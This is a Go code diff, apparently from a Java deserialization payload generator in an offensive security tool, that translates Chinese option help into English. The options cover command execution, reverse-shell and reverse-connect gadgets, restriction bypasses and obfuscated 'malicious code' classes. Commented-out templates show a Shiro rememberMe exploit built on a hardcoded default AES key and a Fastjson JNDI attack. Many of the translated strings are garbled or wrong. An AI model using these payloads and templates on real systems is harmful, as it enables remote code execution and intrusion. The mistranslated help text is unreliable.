@@ -95,19 +95,19 @@ func checkGadgetIsTemplateSupported(gadget string) bool {
 func getClassByGadgetName(name string) []optionInfo {
 	if checkGadgetIsTemplateSupported(name) {
 		return []optionInfo{
-			{Name: "FromBytes", NameVerbose: "FromBytes", Help: "自定义字节码，BASE64格式"},
+			{Name: "FromBytes", NameVerbose: "FromBytes", Help: "Custom bytecode, BASE64 format"},
 			{Name: "RuntimeExec", NameVerbose: "RuntimeExec", Help: ""},
-			{Name: "ProcessBuilderExec", NameVerbose: "ProcessBuilderExec", Help: "可用于绕过RuntimeExec限制"},
-			{Name: "ProcessImplExec", NameVerbose: "ProcessImplExec", Help: "可用于绕过RuntimeExec限制"},
-			{Name: "DNSlog", NameVerbose: "DNSlog", Help: "用于DNSLog检测"},
-			{Name: "SpringEcho", NameVerbose: "SpringEcho", Help: "Spring回显利用"},
-			{Name: "ModifyTomcatMaxHeaderSize", NameVerbose: "ModifyTomcatMaxHeaderSize", Help: "修改TomcatMaxHeaderSize，可用于Shiro漏洞利用时绕过Header长度限制"},
-			{Name: "TcpReverse", NameVerbose: "TcpReverse", Help: "反连到指定地址，并发送Token的内容"},
-			{Name: "TcpReverseShell", NameVerbose: "TcpReverseShell", Help: "反弹Shell"},
+			{Name: "ProcessBuilderExec", NameVerbose: "ProcessBuilderExec", Help: "can be used to bypass RuntimeExec restrictions"},
+			{Name: "ProcessImplExec", NameVerbose: "ProcessImplExec", Help: "can be used to bypass RuntimeExec restrictions"},
+			{Name: "DNSlog", NameVerbose: "DNSlog", Help: "Used for DNSLog detection"},
+			{Name: "SpringEcho", NameVerbose: "SpringEcho", Help: "Spring echo is executed using"},
+			{Name: "ModifyTomcatMaxHeaderSize", NameVerbose: "ModifyTomcatMaxHeaderSize", Help: "Modify TomcatMaxHeaderSize, which can be used to bypass the Header length limit when exploiting Shiro vulnerabilities"},
+			{Name: "TcpReverse", NameVerbose: "TcpReverse", Help: "Reverse connect to the specified address and send Token If the content of"},
+			{Name: "TcpReverseShell", NameVerbose: "TcpReverseShell", Help: "Rebound Shell"},
 		}
 	} else if name == yso.URLDNS || name == yso.FindGadgetByDNS {
 		return []optionInfo{
-			{Name: "DNSlog", NameVerbose: "DNSlog", Help: "通过DNSLog检测"},
+			{Name: "DNSlog", NameVerbose: "DNSlog", Help: "to detect"},
 		}
 	} else {
 		return []optionInfo{
@@ -139,12 +139,12 @@ func (s *Server) GetAllYsoClassOptions(ctx context.Context, req *ypb.YsoOptionsR
 }
 func (s *Server) GetAllYsoClassGeneraterOptions(ctx context.Context, req *ypb.YsoOptionsRequerstWithVerbose) (*ypb.YsoClassOptionsResponseWithVerbose, error) {
 	versionOptions := []*ypb.YsoClassGeneraterOptionsWithVerbose{
-		{Key: string(JavaClassGeneraterOption_Version), Value: "52", Type: string(StringPort), KeyVerbose: "Java 版本", Help: "Class 使用的Java 版本"},
+		{Key: string(JavaClassGeneraterOption_Version), Value: "52", Type: string(StringPort), KeyVerbose: "Java version", Help: "Class Java version used"},
 	}
 	commonOptions := []*ypb.YsoClassGeneraterOptionsWithVerbose{
-		{Key: string(JavaClassGeneraterOption_IsConstructer), Value: "false", Type: string(StringBool), KeyVerbose: "构造方法", Help: "开启则使用构造函数，否则使用静态代码块触发恶意代码"},
-		{Key: string(JavaClassGeneraterOption_IsObfuscation), Value: "true", Type: string(StringBool), KeyVerbose: "混淆", Help: "开启则混淆，否则不混淆"},
-		{Key: string(JavaClassGeneraterOption_ClassName), Value: utils.RandStringBytes(8), Type: string(String), KeyVerbose: "类名", Help: "类名"},
+		{Key: string(JavaClassGeneraterOption_IsConstructer), Value: "false", Type: string(StringBool), KeyVerbose: "Construction method", Help: "Turn on Then use the constructor, otherwise use the static code block to trigger the malicious code"},
+		{Key: string(JavaClassGeneraterOption_IsObfuscation), Value: "true", Type: string(StringBool), KeyVerbose: "Confuse", Help: "If it is turned on, it will be confused, otherwise it will not be confused"},
+		{Key: string(JavaClassGeneraterOption_ClassName), Value: utils.RandStringBytes(8), Type: string(String), KeyVerbose: "Class name", Help: "Class name"},
 	}
 	commonOptions = append(commonOptions, versionOptions...)
 	if checkGadgetIsTemplateSupported(req.Gadget) {
@@ -152,41 +152,41 @@ func (s *Server) GetAllYsoClassGeneraterOptions(ctx context.Context, req *ypb.Ys
 		case JavaBytesCodeType_FromBytes:
 			return &ypb.YsoClassOptionsResponseWithVerbose{
 				Options: append(commonOptions, []*ypb.YsoClassGeneraterOptionsWithVerbose{
-					{Key: string(JavaClassGeneraterOption_Bytes), Value: "", Type: string(Base64Bytes), KeyVerbose: "字节码", Help: "字节码"},
+					{Key: string(JavaClassGeneraterOption_Bytes), Value: "", Type: string(Base64Bytes), KeyVerbose: "bytecode", Help: "bytecode"},
 				}...),
 			}, nil
 		case JavaBytesCodeType_RuntimeExec, JavaBytesCodeType_ProcessImplExec, JavaBytesCodeType_ProcessBuilderExec:
 			return &ypb.YsoClassOptionsResponseWithVerbose{
 				Options: append(commonOptions, []*ypb.YsoClassGeneraterOptionsWithVerbose{
-					{Key: string(JavaClassGeneraterOption_Command), Value: "", Type: string(String), KeyVerbose: "命令", Help: "命令"},
+					{Key: string(JavaClassGeneraterOption_Command), Value: "", Type: string(String), KeyVerbose: "will be echoed. The value of command", Help: "will be echoed. The value of command"},
 				}...),
 			}, nil
 		case JavaBytesCodeType_DNSlog:
 			return &ypb.YsoClassOptionsResponseWithVerbose{
 				Options: append(commonOptions, []*ypb.YsoClassGeneraterOptionsWithVerbose{
-					{Key: string(JavaClassGeneraterOption_Domain), Value: "", Type: string(String), KeyVerbose: "DNSLog域名", Help: "填入DNSLog地址"},
+					{Key: string(JavaClassGeneraterOption_Domain), Value: "", Type: string(String), KeyVerbose: "DNSLog domain name", Help: "Fill in the DNSLog address"},
 				}...),
 			}, nil
 		case JavaBytesCodeType_SpringEcho:
 			return &ypb.YsoClassOptionsResponseWithVerbose{
 				Options: append(commonOptions, []*ypb.YsoClassGeneraterOptionsWithVerbose{
-					{Key: string(JavaClassGeneraterOption_IsSpringEchoBody), Value: "false", Type: string(StringBool), KeyVerbose: "Body输出", Help: "开启则在Body输出，否则在Header输出", BindOptions: map[string]*ypb.YsoClassOptionsResponseWithVerbose{
+					{Key: string(JavaClassGeneraterOption_IsSpringEchoBody), Value: "false", Type: string(StringBool), KeyVerbose: "Body output", Help: "If turned on, it will be output in the Body , otherwise output", BindOptions: map[string]*ypb.YsoClassOptionsResponseWithVerbose{
 						"false": {
 							Options: []*ypb.YsoClassGeneraterOptionsWithVerbose{
-								{Key: string(JavaClassGeneraterOption_SpringHeaderKey), Value: "", Type: string(String), KeyVerbose: "HeaderKey", Help: "在Header回显的Key"},
-								{Key: string(JavaClassGeneraterOption_SpringHeaderValue), Value: "", Type: string(String), KeyVerbose: "HeaderValue", Help: "在Header回显的Value"},
+								{Key: string(JavaClassGeneraterOption_SpringHeaderKey), Value: "", Type: string(String), KeyVerbose: "HeaderKey", Help: "Key echoed in Header"},
+								{Key: string(JavaClassGeneraterOption_SpringHeaderValue), Value: "", Type: string(String), KeyVerbose: "HeaderValue", Help: "echoed in the header"},
 							},
 						},
 						"true": {
 							Options: []*ypb.YsoClassGeneraterOptionsWithVerbose{
-								{Key: string(JavaClassGeneraterOption_SpringParam), Value: "", Type: string(String), KeyVerbose: "命令", Help: "在Body回显的命令"},
+								{Key: string(JavaClassGeneraterOption_SpringParam), Value: "", Type: string(String), KeyVerbose: "will be echoed. The value of command", Help: "The command echoed in the Body"},
 							},
 						},
 					}},
-					{Key: string(JavaClassGeneraterOption_IsSpringRuntimeExecAction), Value: "false", Type: string(StringBool), KeyVerbose: "执行命令", Help: "开启则执行命令并回显结果，否则只回显命令"},
-					{Key: string(JavaClassGeneraterOption_SpringHeaderKey), Value: "", Type: string(String), KeyVerbose: "HeaderKey", Help: "在Header回显的Key"},
-					{Key: string(JavaClassGeneraterOption_SpringHeaderValue), Value: "", Type: string(String), KeyVerbose: "HeaderValue", Help: "在Header回显的Value"},
-					{Key: string(JavaClassGeneraterOption_SpringParam), Value: "", Type: string(String), KeyVerbose: "命令", Help: "在Body回显的命令"},
+					{Key: string(JavaClassGeneraterOption_IsSpringRuntimeExecAction), Value: "false", Type: string(StringBool), KeyVerbose: "Command", Help: "is enabled, the command will be executed and the result will be echoed, otherwise only the command"},
+					{Key: string(JavaClassGeneraterOption_SpringHeaderKey), Value: "", Type: string(String), KeyVerbose: "HeaderKey", Help: "Key echoed in Header"},
+					{Key: string(JavaClassGeneraterOption_SpringHeaderValue), Value: "", Type: string(String), KeyVerbose: "HeaderValue", Help: "echoed in the header"},
+					{Key: string(JavaClassGeneraterOption_SpringParam), Value: "", Type: string(String), KeyVerbose: "will be echoed. The value of command", Help: "The command echoed in the Body"},
 				}...),
 			}, nil
 		case JavaBytesCodeType_ModifyTomcatMaxHeaderSize:
@@ -194,16 +194,16 @@ func (s *Server) GetAllYsoClassGeneraterOptions(ctx context.Context, req *ypb.Ys
 		case JavaBytesCodeType_TcpReverse:
 			return &ypb.YsoClassOptionsResponseWithVerbose{
 				Options: append(commonOptions, []*ypb.YsoClassGeneraterOptionsWithVerbose{
-					{Key: string(JavaClassGeneraterOption_Port), Value: "", Type: string(StringPort), KeyVerbose: "端口", Help: "端口"},
-					{Key: string(JavaClassGeneraterOption_Host), Value: "", Type: string(String), KeyVerbose: "主机", Help: "主机"},
-					{Key: string(JavaClassGeneraterOption_TcpReverseToken), Value: "", Type: string(String), KeyVerbose: "Token", Help: "反连的Token"},
+					{Key: string(JavaClassGeneraterOption_Port), Value: "", Type: string(StringPort), KeyVerbose: "Port", Help: "Port"},
+					{Key: string(JavaClassGeneraterOption_Host), Value: "", Type: string(String), KeyVerbose: "Host", Help: "Host"},
+					{Key: string(JavaClassGeneraterOption_TcpReverseToken), Value: "", Type: string(String), KeyVerbose: "Token", Help: "Reverse Token"},
 				}...),
 			}, nil
 		case JavaBytesCodeType_TcpReverseShell:
 			return &ypb.YsoClassOptionsResponseWithVerbose{
 				Options: append(commonOptions, []*ypb.YsoClassGeneraterOptionsWithVerbose{
-					{Key: string(JavaClassGeneraterOption_Port), Value: "", Type: string(StringPort), KeyVerbose: "端口", Help: "端口"},
-					{Key: string(JavaClassGeneraterOption_Host), Value: "", Type: string(String), KeyVerbose: "主机", Help: "主机"},
+					{Key: string(JavaClassGeneraterOption_Port), Value: "", Type: string(StringPort), KeyVerbose: "Port", Help: "Port"},
+					{Key: string(JavaClassGeneraterOption_Host), Value: "", Type: string(String), KeyVerbose: "Host", Help: "Host"},
 				}...),
 			}, nil
 		default:
@@ -212,11 +212,11 @@ func (s *Server) GetAllYsoClassGeneraterOptions(ctx context.Context, req *ypb.Ys
 	} else {
 		if JavaBytesCodeType(req.Class) == JavaBytesCodeType_RuntimeExec {
 			return &ypb.YsoClassOptionsResponseWithVerbose{Options: []*ypb.YsoClassGeneraterOptionsWithVerbose{
-				{Key: string(JavaClassGeneraterOption_Command), Value: "", Type: string(String), KeyVerbose: "命令", Help: "命令"},
+				{Key: string(JavaClassGeneraterOption_Command), Value: "", Type: string(String), KeyVerbose: "will be echoed. The value of command", Help: "will be echoed. The value of command"},
 			}}, nil
 		} else if JavaBytesCodeType(req.Class) == JavaBytesCodeType_DNSlog {
 			return &ypb.YsoClassOptionsResponseWithVerbose{Options: []*ypb.YsoClassGeneraterOptionsWithVerbose{
-				{Key: string(JavaClassGeneraterOption_Domain), Value: "", Type: string(String), KeyVerbose: "DNSLog域名", Help: "填入DNSLog地址"},
+				{Key: string(JavaClassGeneraterOption_Domain), Value: "", Type: string(String), KeyVerbose: "DNSLog domain name", Help: "Fill in the DNSLog address"},
 			}}, nil
 		} else {
 			return nil, utils.Errorf("not support gadget: %s and class: %s", req.Gadget, req.Class)
@@ -363,15 +363,15 @@ if err {
     return
 }
 
-// 16进制展示payload
+// Hexadecimal display of payload
 hexPayload = codec.EncodeToHex(gadgetBytes)    
 //(hexPayload)
 
-// // Shiro利用
+// // through DNSLog Shiro uses
 // target = "127.0.0.1:8080"
-// base64Key = "kPH+bIxk5D2deZiIxcaaaA==" // base64编码的key
-// key,_ = codec.DecodeBase64(base64Key) // 生成key
-// payload = codec.PKCS5Padding(gadgetBytes, 16) // 加密payload
+// base64Key = "kPH+bIxk5D2deZiIxcaaaA==" // base64 encoded key
+// key,_ = codec.DecodeBase64(base64Key) // to generate key
+// payload = codec.PKCS5Padding(gadgetBytes, 16) // Encrypt payload
 // encodePayload = codec.AESCBCEncrypt(key, payload, nil)[0]
 // finalPayload = codec.EncodeBase64(append(key, encodePayload...))
 // rsp,req,_ = poc.HTTP(` + "`" + `GET /login HTTP/1.1
@@ -382,10 +382,10 @@ hexPayload = codec.EncodeToHex(gadgetBytes)
 // Cache-Control: no-cache
 // Cookie: rememberMe={{params(payload)}}
 // User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
-// ` + "`" + `,poc.params({"payload":finalPayload,"target":target})) // 发送payload
+// ` + "`" + `,poc.params({"payload":finalPayload,"target":target})) // Send payload
 // str.SplitHTTPHeadersAndBodyFromPacket(rsp)
-// log.info("发送Payload成功")
-// log.info("响应包: ",string(rsp))	`
+// log.info("Payload sent successfully")
+// log.info("in the Header. Response packet: ",string(rsp))	`
 
 	classCodeTmp := `classObj,err = yso.$evilClass($options)
 if err {
@@ -398,12 +398,12 @@ if err {
 	return
 }
 
-// 16进制展示payload
+// Hexadecimal display of payload
 hexPayload = codec.EncodeToHex(classBytes)    
 //println(hexPayload)
 
-// // fastjson利用
-// // 参数
+// // Fastjson uses
+// // Parameter
 // localIp = "1.1.1.1"
 // port = 8086
 // target = "1.1.1.1"
@@ -418,12 +418,12 @@ hexPayload = codec.EncodeToHex(classBytes)
 //     facades.rmiResourceAddr(className, httpReverseAddress),
 // )
 // s.OnHandle(fn(msg){
-//     log.info("收到请求: %v", msg)
+//     log.info("Receive request: %v", msg)
 // })
 // go s.Serve()
 // err = x.WaitConnect(sprintf("%s:%d",localIp,port), 2)
 // if err{
-//     log.error("连接 FacadeServer 失败，可能启动失败")
+//     log.error("Failed to connect to FacadeServer, may fail to start")
 //     cancle()
 //     return
 // }
@@ -445,8 +445,8 @@ hexPayload = codec.EncodeToHex(classBytes)
 // }
 // ` + "`" + `,poc.params({"target":target,"reverseAddr":ldapReverseAddress}))
 
-// log.info("发送Payload成功")
-// log.info("响应包: %s",string(rsp))
+// log.info("Payload sent successfully")
+// log.info("response packet: %s",string(rsp))
 `
 
 	className, preOptionsCode, optionsCode := optionsToYaklangCode(req.Options, true)
